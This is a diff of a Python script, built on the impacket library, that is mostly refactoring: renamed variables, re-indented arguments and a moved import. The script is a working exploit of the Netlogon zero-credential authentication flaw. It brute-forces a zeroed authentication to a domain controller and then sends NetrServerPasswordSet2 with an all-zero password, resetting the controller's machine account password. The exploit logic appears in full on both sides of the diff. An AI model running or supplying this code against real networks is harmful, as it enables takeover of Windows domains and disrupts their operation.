@@ -8,16 +8,16 @@
 from impacket.dcerpc.v5 import nrpc, epm
 from impacket.dcerpc.v5.dtypes import NULL
 from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2
 from impacket import crypto
 
 import hmac, hashlib, struct, sys, socket, time
 from binascii import hexlify, unhexlify
 from subprocess import check_call
 
-# Give up brute-forcing after this many attempts. If vulnerable, ~256 attempts are expected to be necessary on average.
-# False negative chance: 0.04%
-from impacket.dcerpc.v5.nrpc import NetrServerPasswordSet2
 
+# Give up brute-forcing after this many attempts. If vulnerable, ~256 attempts are expected to be necessary on average.
+# False negative chance: ~0.04%
 MAX_ATTEMPTS = 2000
 
 
@@ -46,27 +46,27 @@ def try_zero_authenticate(dc_handle, dc_ip, target_computer):
     try:
         server_auth = nrpc.hNetrServerAuthenticate3(
             rpc_con, dc_handle + '\x00',
-                     target_computer + '$\x00',
+            target_computer + '$\x00',
             nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
-                     target_computer + '\x00',
+            target_computer + '\x00',
             ciphertext,
             flags
         )
 
         # It worked!
         # assert server_auth['ErrorCode'] == 0
-        # now exploit the vulnerability:
-        newPassRequest: NetrServerPasswordSet2 = nrpc.NetrServerPasswordSet2()
-        newPassRequest['PrimaryName'] = dc_handle + '\x00'
-        newPassRequest['AccountName'] = target_computer + '$\x00'
-        newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
+        # now let's exploit the vulnerability:
+        new_pass_request: NetrServerPasswordSet2 = nrpc.NetrServerPasswordSet2()
+        new_pass_request['PrimaryName'] = dc_handle + '\x00'
+        new_pass_request['AccountName'] = target_computer + '$\x00'
+        new_pass_request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
         auth = nrpc.NETLOGON_AUTHENTICATOR()
         auth['Credential'] = b'\x00' * 8
         auth['Timestamp'] = 0
-        newPassRequest['Authenticator'] = auth
-        newPassRequest['ComputerName'] = target_computer + '\x00'
-        newPassRequest['ClearNewPassword'] = b'\x00' * 516
-        rpc_con.request(newPassRequest)
+        new_pass_request['Authenticator'] = auth
+        new_pass_request['ComputerName'] = target_computer + '\x00'
+        new_pass_request['ClearNewPassword'] = b'\x00' * 516
+        rpc_con.request(new_pass_request)
         return rpc_con
 
     except nrpc.DCERPCSessionError as ex:
